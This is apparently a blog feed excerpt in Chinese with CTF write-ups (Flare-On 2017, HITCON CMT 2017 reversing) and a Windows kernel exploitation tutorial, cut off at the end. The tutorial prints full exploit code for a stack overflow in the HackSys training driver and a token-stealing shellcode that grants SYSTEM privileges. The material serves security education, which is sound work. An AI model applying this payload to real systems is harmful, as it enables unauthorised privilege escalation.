&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'rot13'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we enter &lt;code class=&quot;highlighter-rouge&quot;&gt;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&lt;/code&gt; as the input, the message box shows us the flag for this challenge: &lt;code class=&quot;highlighter-rouge&quot;&gt;ClientSideLoginsAreEasy@flare-on.com&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;
&lt;ul&gt;
  &lt;li&gt;Challenge #1 by Dominik Weber (@Invalid_handle)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/0x000050/CTF/blob/master/2017_Flare-On/01_Login/login.html&quot;&gt;Challenge download&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>Windows Kernel Exploit - Stack Overflow</title>
   <link href="http://0.0.0.0:4000/2018/01/10/Windows-Kernel-Exploit-Stack-Overflow.html"/>
   <updated>2018-01-10T00:00:00+08:00</updated>
   <id>http://0.0.0.0:4000/2018/01/10/Windows Kernel Exploit - Stack Overflow</id>
   <content type="html">&lt;p&gt;本篇以 HEVD 為案例進行實作，HEVD 是由 HackSysTeam 所開發的 Kernel Driver，該專案中包含了許多常見的漏洞，適合想練習 Windows Kernel Exploit 的研究人員練習，藉以用來練習各種漏洞利用方法。本篇以 Windows 7 為範例，本次測試的 Windows 7 沒有 SMEP 與 SMAP 防護機制，相對較簡單，有機會也會在其他版本的 Windows 上練習。&lt;/p&gt;

&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;本篇會省略工作環境的準備，專注於漏洞利用操作的細節&lt;/li&gt;
  &lt;li&gt;本篇利用的 Windows Driver 為 &lt;a href=&quot;https://github.com/hacksysteam/HackSysExtremeVulnerableDriver&quot;&gt;HackSysExtremeVulnerableDriver&lt;/a&gt;，選擇這項資源當作示範的原因是有 Source Code 能參考(更容易理解漏洞)，相關 solution 可以參考 &lt;a href=&quot;https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn&quot;&gt;FuzzySecurity 的 PowerShell Kernel Pwn&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;environment&quot;&gt;Environment&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Windows 7 x86 SP1 (Version 6.1.7601)&lt;/li&gt;
  &lt;li&gt;無 SMEP(supervisor mode execution prevention) 防護機制&lt;/li&gt;
  &lt;li&gt;無 SMAP(supervisor mode access prevention) 防護機制&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;tools&quot;&gt;Tools&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;VMware Workstation 12&lt;/li&gt;
  &lt;li&gt;Visual Studio 2017&lt;/li&gt;
  &lt;li&gt;WinDBG&lt;/li&gt;
  &lt;li&gt;IDA Pro&lt;/li&gt;
  &lt;li&gt;osrloaderv30&lt;/li&gt;
  &lt;li&gt;cmd&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h3&gt;

&lt;p&gt;這是一個在 Windows Kernel Driver 的 StackOverflow 漏洞，接下來將了解該漏洞的細節。&lt;/p&gt;

&lt;p&gt;通常 Windows Kernel Driver 的研究，會先從負責處理 IOCTL 的函數開始看起，可以透過 &lt;code class=&quot;highlighter-rouge&quot;&gt;DriverEntry&lt;/code&gt; 中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;DriverObject -&amp;gt; MajorFunction[IRP_MJ_DEVICE_CONTROL]&lt;/code&gt; 找到，而在 HackSysTeam Driver 中可以透過 control code &lt;code class=&quot;highlighter-rouge&quot;&gt;0x222003&lt;/code&gt; 來觸發 Stack Overflow&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/v26v5uU.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這裡補充一下 &lt;a href=&quot;https://msdn.microsoft.com/zh-tw/library/windows/desktop/aa363216(v=vs.85).aspx&quot;&gt;IOCTL&lt;/a&gt; 的知識，Windows Kernel Driver 的 IOCTL 是 User Mode 與 Kernel Driver 之間溝通的方式，Kernel 與 User 會透過 IOCTL 來進行資料的傳遞，當 Kernel Driver 在處理從 User Mode 傳過來的資料時，若沒有檢查，可能會有問題。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike=&quot;&gt;BOOL WINAPI DeviceIoControl(
  _In_        HANDLE       hDevice,
  _In_        DWORD        dwIoControlCode,
  _In_opt_    LPVOID       lpInBuffer,
  _In_        DWORD        nInBufferSize,
  _Out_opt_   LPVOID       lpOutBuffer,
  _In_        DWORD        nOutBufferSize,
  _Out_opt_   LPDWORD      lpBytesReturned,
  _Inout_opt_ LPOVERLAPPED lpOverlapped
);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;了解 IOCTL 後，回到原來所討論的漏洞，HackSys Team 有提供 &lt;code class=&quot;highlighter-rouge&quot;&gt;StackOverflow.c&lt;/code&gt; 的 &lt;a href=&quot;https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/StackOverflow.c&quot;&gt;Source Code&lt;/a&gt; ，不妨看 Source Code 相關部分來理解此漏洞&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike=&quot;&gt;NTSTATUS TriggerStackOverflow(IN PVOID UserBuffer, IN SIZE_T Size) {
    NTSTATUS Status = STATUS_SUCCESS;
    ULONG KernelBuffer[2048] = {0};

    PAGED_CODE();

    __try {
        // Verify if the buffer resides in user mode
        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(KernelBuffer));

        DbgPrint(&quot;[+] UserBuffer: 0x%p\n&quot;, UserBuffer);
        DbgPrint(&quot;[+] UserBuffer Size: 0x%X\n&quot;, Size);
        DbgPrint(&quot;[+] KernelBuffer: 0x%p\n&quot;, &amp;amp;KernelBuffer);
        DbgPrint(&quot;[+] KernelBuffer Size: 0x%X\n&quot;, sizeof(KernelBuffer));

#ifdef SECURE
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,
        // there will be no overflow
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));  
        //用 sizeof 限制大小
#else
        DbgPrint(&quot;[+] Triggering Stack Overflow\n&quot;);

        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
        // because the developer is passing the user supplied size directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of KernelBuffer
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);  //UserBuffer 的大小
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint(&quot;[-] Exception Code: 0x%X\n&quot;, Status);
    }

    return Status;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RtlCopyMemory&lt;/code&gt; 就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;memcpy&lt;/code&gt;，常見的問題是沒有檢查 User Mode 傳過來的參數或大小，先看有問題的寫法( Source Code 第 28 行 )，這裡的 &lt;code class=&quot;highlighter-rouge&quot;&gt;Size&lt;/code&gt; 是 UserBuffer 的大小&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-clike=&quot;&gt;RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;正確的寫法可以用 &lt;code class=&quot;highlighter-rouge&quot;&gt;sizeof&lt;/code&gt; 來限制 memcpy 時，copy 的大小不會超出 &lt;code class=&quot;highlighter-rouge&quot;&gt;KernelBuffer&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-clike=&quot;&gt;RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;若是沒有檢查，可能會造成 Overflow，蓋到 ret&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-0000081C KernelBuffer    db 2048 dup(?)
-0000001C var_1C          dd ?
-00000018 ms_exc          CPPEH_RECORD ?
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008 UserBuffer      dd ?                    ; offset
+0000000C Size            dd ?
+00000010
+00000010 ; end of stack variables
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;exploit&quot;&gt;Exploit&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;首先，在 User Mode 申請一塊具有可讀可寫可執行 (RWX) 權限的記憶體，用來存放 Shellcode&lt;/li&gt;
  &lt;li&gt;把 token stealing shellcode 放到這塊記憶體中&lt;/li&gt;
  &lt;li&gt;取得 HacksysExtremeVulnerableDriver device 的 Handle&lt;/li&gt;
  &lt;li&gt;將 return address 修改為 Userland 中 shellcode 的記憶體位置， 當函數 return 後，shellcode 就會被執行&lt;/li&gt;
  &lt;li&gt;Shellcode 會去找 system 這隻 process (PID = 4)，並取得他的 token&lt;/li&gt;
  &lt;li&gt;還原 StackFrame，否則會藍屏，因為在 Kernel 中做事&lt;/li&gt;
  &lt;li&gt;擁有 system token 代表具有 system 的權限，用該權限建立的 cmd.exe 會有 system 的權限&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;HackSys Extreme Vulnerable Driver 的 &lt;a href=&quot;https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Exploit/StackOverflow.c&quot;&gt;Exploit StackOverflow.c&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike=&quot;&gt;#include &quot;StackOverflow.h&quot;

DWORD WINAPI StackOverflowThread(LPVOID Parameter) {
    HANDLE hFile = NULL;
    ULONG BytesReturned;
    PVOID MemoryAddress = NULL;
    PULONG UserModeBuffer = NULL;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    PVOID EopPayload = &amp;amp;TokenStealingPayloadWin7; //shellcode
    SIZE_T UserModeBufferSize = (BUFFER_SIZE + RET_OVERWRITE) * sizeof(ULONG);

    __try {
        DEBUG_MESSAGE(&quot;\t[+] Setting Thread Priority\n&quot;);

        if (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST)) {
            DEBUG_ERROR(&quot;\t\t[-] Failed To Set As THREAD_PRIORITY_HIGHEST\n&quot;);
        }
        else {
            DEBUG_INFO(&quot;\t\t[+] Priority Set To THREAD_PRIORITY_HIGHEST\n&quot;);
        }

        // Get the device handle
        DEBUG_MESSAGE(&quot;\t[+] Getting Device Driver Handle\n&quot;);
        DEBUG_INFO(&quot;\t\t[+] Device Name: %s\n&quot;, FileName);

        hFile = GetDeviceHandle(FileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR(&quot;\t\t[-] Failed Getting Device Handle: 0x%X\n&quot;, GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO(&quot;\t\t[+] Device Handle: 0x%X\n&quot;, hFile);
        }

        DEBUG_MESSAGE(&quot;\t[+] Setting Up Vulnerability Stage\n&quot;);

        DEBUG_INFO(&quot;\t\t[+] Allocating Memory For Buffer\n&quot;);

        UserModeBuffer = (PULONG)HeapAlloc(GetProcessHeap(),
                                           HEAP_ZERO_MEMORY,
                                           UserModeBufferSize);

        if (!UserModeBuffer) {
            DEBUG_ERROR(&quot;\t\t\t[-] Failed To Allocate Memory: 0x%X\n&quot;, GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO(&quot;\t\t\t[+] Memory Allocated: 0x%p\n&quot;, UserModeBuffer);
            DEBUG_INFO(&quot;\t\t\t[+] Allocation Size: 0x%X\n&quot;, UserModeBufferSize);
        }

        DEBUG_INFO(&quot;\t\t[+] Preparing Buffer Memory Layout\n&quot;);

        RtlFillMemory((PVOID)UserModeBuffer, UserModeBufferSize, 0x41);

        MemoryAddress = (PVOID)(((ULONG)UserModeBuffer + UserModeBufferSize) - sizeof(ULONG));
        *(PULONG)MemoryAddress = (ULONG)EopPayload;

        DEBUG_INFO(&quot;\t\t\t[+] RET Value: 0x%p\n&quot;, *(PULONG)MemoryAddress);
        DEBUG_INFO(&quot;\t\t\t[+] RET Address: 0x%p\n&quot;, MemoryAddress);

        DEBUG_INFO(&quot;\t\t[+] EoP Payload: 0x%p\n&quot;, EopPayload);

        DEBUG_MESSAGE(&quot;\t[+] Triggering Kernel Stack Overflow\n&quot;);

        OutputDebugString(&quot;****************Kernel Mode****************\n&quot;);

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_STACK_OVERFLOW,
                        (LPVOID)UserModeBuffer,
                        (DWORD)UserModeBufferSize,
                        NULL,
                        0,
                        &amp;amp;BytesReturned,
                        NULL);

        OutputDebugString(&quot;****************Kernel Mode****************\n&quot;);

        HeapFree(GetProcessHeap(), 0, (LPVOID)UserModeBuffer);

        UserModeBuffer = NULL;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR(&quot;\t\t[-] Exception: 0x%X\n&quot;, GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;shellcode&quot;&gt;Shellcode&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FS:[0x124]&lt;/code&gt; 在 Win 7 上會指向目前 Process 的 &lt;code class=&quot;highlighter-rouge&quot;&gt;KTHREAD&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/aGbWKxm.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;GS&lt;/code&gt; 與 &lt;code class=&quot;highlighter-rouge&quot;&gt;FS&lt;/code&gt; 是根據 OS Kernel 來決定用途，&lt;code class=&quot;highlighter-rouge&quot;&gt;FS&lt;/code&gt; 在 Windows 上會指向一些 structure&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ETHREAD&lt;/code&gt; 結構與 &lt;code class=&quot;highlighter-rouge&quot;&gt;ERPOCESS&lt;/code&gt; 結構圖&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/FVy7m0t.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;因為我們將函數 ret 的位置改成我們的 shellcode，Shellcode 執行完會無法回到原本正確的位置，所以為了讓程式能繼續執行，則需要調整 esp 的位置&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike=&quot;&gt;VOID TokenStealingPayloadWin7() {
    // Importance of Kernel Recovery
    __asm {
        pushad                               ; Save registers state
                                             ; 存目前暫存器的狀態，後面需要還原用

        ; Start of Token Stealing Stub
        xor eax, eax                         ; Set ZERO
        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                             ; _KTHREAD is located at FS:[0x124]
                                             ; 取得目前 Process 的 KTHREAD 放到 eax
                                             

        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process
                                             ; 取得[目前 Process 的 KTHREAD + EPROCESS_OFFSET] 的位置放到 eax
        mov ecx, eax                         ; Copy current process _EPROCESS structure
                                             ; 複製目前 Process 的 Eprocess structure 到 ecx
           
        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4

        SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
                                             ; 從目前 eprocess 的 ActiveProcessLinks 找 system 的 eprocess 
            sub eax, FLINK_OFFSET            ; Flink 會指向下個 eprocess 的 ActiveProcessLinks 所在位置(而不是開頭)，所以需要 sub FLINK_OFFSET 回到下個 eprocess 的開頭
            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
                                             ; 比較 nt!_EPROCESS.UniqueProcessId 是不是 4
            jne SearchSystemPID              ; 如果不是 4 就重新找，所以當跳出這個迴圈出來一定會是 4

        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
                                             ; edx 指向 token 所在位置  

        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                             ; with SYSTEM process nt!_EPROCESS.Token
                                             ; 將目前 process token 換成 system token
        ; End of Token Stealing Stub

        popad                                ; Restore registers state

        ; Kernel Recovery Stub
        xor eax, eax                         ; Set NTSTATUS SUCCEESS
        add esp, 12                          ; Fix the stack
        pop ebp                              ; Restore saved EBP
        ret 8                                ; Return cleanly
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;result&quot;&gt;Result&lt;/h3&gt;
&lt;p&gt;開啟 cmd.exe 使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; 看目前的權限&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/8dXeTWf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;執行 Exploit code&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/uEdzuZG.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再次開啟 cmd.exe 使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; 看目前的權限&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/oBqLnbi.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;resources&quot;&gt;Resources&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.codemachine.com/article_kernelstruct.html&quot;&gt;codemachine - Windows kernel data structures&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.codemachine.com/article_kernelstruct.html&quot;&gt;McDermott - x64 Kernel Privilege Escalation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives&quot;&gt;coresecurity - Abusing GDI for ring0 exploit primitives&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.fuzzysecurity.com/tutorials/expDev/14.html&quot;&gt;fuzzysecurity - Kernel Exploitation Stack Overflow&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf&quot;&gt;Tarjei Mandt - Kernel Pool Exploitation on Windows 7&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf&quot;&gt;j00ru - Reserve Objects in Windows 7&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>2017 HITCON CMT mini wargame Reverse</title>
   <link href="http://0.0.0.0:4000/2017/08/26/2017-HITCON-CMT-mini-wargame.html"/>
   <updated>2017-08-26T00:00:00+08:00</updated>
   <id>http://0.0.0.0:4000/2017/08/26/2017 HITCON CMT mini wargame</id>
   <content type="html">&lt;p&gt;今年 HITCON 在 HITCON CMT 研討會期間又舉辦了與前幾年類似的 wargame，相較於 HITCON CTF 是比較簡單的小型競賽。很幸運跟以色列的朋友一起組隊，因為我很 Lazy 而他們是 Hacker，所以隊名就取 &lt;code class=&quot;highlighter-rouge&quot;&gt;Lazyhacker&lt;/code&gt;。在團隊中我負責解 Reverse 的題型，這次 Reverse 只有兩題，都是 Windows 題，分別是小算盤跟踩地雷，還蠻有趣的，所以想紀錄一下。&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;100-calcexe&quot;&gt;[100] calc.exe&lt;/h2&gt;
&lt;h3 id=&quot;題目描述&quot;&gt;題目描述&lt;/h3&gt;
&lt;p&gt;毫無反應，就是一個具有計算功能的計算機。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/DMo6dMi.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;解法&quot;&gt;解法&lt;/h3&gt;

&lt;p&gt;觀察發現似乎跟 Windows 的小算盤一模一樣，因此拿了 Windows 原版的 &lt;code class=&quot;highlighter-rouge&quot;&gt;calc.exe&lt;/code&gt; 執行檔來做 diff ( 這裡用 &lt;code class=&quot;highlighter-rouge&quot;&gt;vimdiff&lt;/code&gt; )，發現其中多了一些看起來很可疑的 code&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/6NRAkp5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;放進 IDA Pro 分析 &lt;code class=&quot;highlighter-rouge&quot;&gt;sub_10136B0()&lt;/code&gt; (可以 search opcode 或計算 offset)，得知是在做某種字串的比對&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/NAUhSNt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;簡化來說，就是取數字框的 &lt;code class=&quot;highlighter-rouge&quot;&gt;HWND&lt;/code&gt;，讀數字框上面的文字，並驗證這段文字&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HWND hwnd = GetDlgItem(g_hWnd, 403);  //  403 是數字框的控制項 ID
GetWindowTextA(hwnd, buf, 256);
驗證這段文字
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[補充] 控制項的 ID 可以透過 Resource Hacker 來看
&lt;img src=&quot;https://i.imgur.com/VPDAWFP.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;也可以用 ollydbg 追蹤來理解程式的行為，透過追蹤可以知道: 當按下 &lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt; 時，會跳到這個有被改過的地方，至於要輸入什麼數字才會跳出 FLAG 呢? 可以停在 &lt;code class=&quot;highlighter-rouge&quot;&gt;101371A&lt;/code&gt; 這裡看他怎麼比較的，他比較的值分別是&lt;code class=&quot;highlighter-rouge&quot;&gt;0x31323035&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;0x32303536&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;0x352E3631&lt;/code&gt; 與 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x36313230&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jl2IAu6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;對照 ASCII 表並考慮 little endian 的話，就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;5021650216.50216&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x31323035 --&amp;gt; 5021
0x32303536 --&amp;gt; 6502
0x352E3631 --&amp;gt; 16.5
0x36313230 --&amp;gt; 0216
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果用 IDA Pro 來看的話也可以解回來，判斷的部分為
&lt;img src=&quot;https://i.imgur.com/kQuEkdy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因此只要在視窗中輸入&lt;code class=&quot;highlighter-rouge&quot;&gt;5021650216.50216&lt;/code&gt; 並按下 &lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt; 
&lt;img src=&quot;https://i.imgur.com/7qEETTe.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;就會跳出小框框顯示 Flag 
&lt;img src=&quot;https://i.imgur.com/QTbNeYZ.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;The flag is: hitcon{50216_is_our_god}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;200-winmineexe&quot;&gt;[200] winmine.exe&lt;/h2&gt;
&lt;h3 id=&quot;題目描述-1&quot;&gt;題目描述&lt;/h3&gt;
&lt;p&gt;一個不平凡的踩地雷，開啟就是 40*40 的大小，除了特定的位置外，其他格子都是地雷&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/f4v3lfE.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://i.imgur.com/PbyCTrV.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;解法-1&quot;&gt;解法&lt;/h3&gt;
&lt;p&gt;踩地雷遊戲，執行後很幸運地踩到了幾次正確位置&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/16XPA2L.jpg&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://i.imgur.com/jmsMbVy.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;猜想 “正確位置出現的形狀” 可能依序就是整串 FLAG 依序出現的順序( 可能是 &lt;code class=&quot;highlighter-rouge&quot;&gt;THE flag is hitcon{xxx}&lt;/code&gt; 之類的 )，因此期望在 IDA Pro 之中看到放的位置&lt;/p&gt;

&lt;p&gt;在 &lt;code class=&quot;highlighter-rouge&quot;&gt;sub_962880()&lt;/code&gt; 之中有 &lt;code class=&quot;highlighter-rouge&quot;&gt;MessageBoxA(0, &quot;Are u a hacker O_o?&quot;, &quot;O_o?&quot;, 0x20u);&lt;/code&gt; 猜想可能驗證 flag 相關的東西在附近&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:009629E1 loc_9629E1:                             ; CODE XREF: sub_962880+12Dj
.text:009629E1                 mov     ebx, ds:GetTickCount
.text:009629E7                 add     edi, 0FFFFFFFDh
.text:009629EA                 call    ebx ; GetTickCount
.text:009629EC                 xor     edx, edx
.text:009629EE                 mov     ecx, 0FFh
.text:009629F3                 div     ecx
.text:009629F5                 mov     esi, edx
.text:009629F7                 call    sub_965797
.text:009629FC                 add     eax, esi
.text:009629FE                 xor     edx, edx
.text:00962A00                 div     edi
.text:00962A02                 lea     esi, [edx+1]
.text:00962A05                 call    ebx ; GetTickCount
.text:00962A07                 call    sub_965797
.text:00962A0C                 mov     ecx, g_check
.text:00962A12                 mov     edx, 5
.text:00962A17                 shl     ecx, 4
.text:00962A1A                 sub     ecx, g_check
.text:00962A20                 imul    eax, esi, 65h
.text:00962A23                 add     ecx, offset g_enc
.text:00962A29                 add     eax, offset unk_9775E1
.text:00962A2E                 xchg    ax, ax
.text:00962A30

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最後從 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00962A23&lt;/code&gt; 跳過去 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00973BD9&lt;/code&gt; 會看到這段&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.rdata:00973BD8                 db    1
.rdata:00973BD9 g_enc           db    1                 ; DATA XREF: sub_962880+1A3o
.rdata:00973BDA                 db    1
.rdata:00973BDB                 db    0
.rdata:00973BDC                 db    1
.rdata:00973BDD                 db    0
.rdata:00973BDE                 db    0
.rdata:00973BDF                 db    1
.rdata:00973BE0                 db    0
.rdata:00973BE1                 db    0
.rdata:00973BE2                 db    1
.rdata:00973BE3                 db    0
.rdata:00973BE4                 db    0
.rdata:00973BE5                 db    1
.rdata:00973BE6                 db    0
.rdata:00973BE7                 db    1
.rdata:00973BE8                 db    0
.rdata:00973BE9                 db    1
.rdata:00973BEA                 db    1
.rdata:00973BEB                 db    0
.rdata:00973BEC                 db    1
.rdata:00973BED                 db    1
.rdata:00973BEE                 db    1
.rdata:00973BEF                 db    1
.rdata:00973BF0                 db    1
.rdata:00973BF1                 db    0
.rdata:00973BF2                 db    1
.rdata:00973BF3                 db    1
.rdata:00973BF4                 db    0
.rdata:00973BF5                 db    1
.rdata:00973BF6                 db    1
.rdata:00973BF7                 db    1
.rdata:00973BF8                 db    1
.rdata:00973BF9                 db    1
.rdata:00973BFA                 db    0
.rdata:00973BFB                 db    0
.rdata:00973BFC                 db    1
.rdata:00973BFD                 db    1
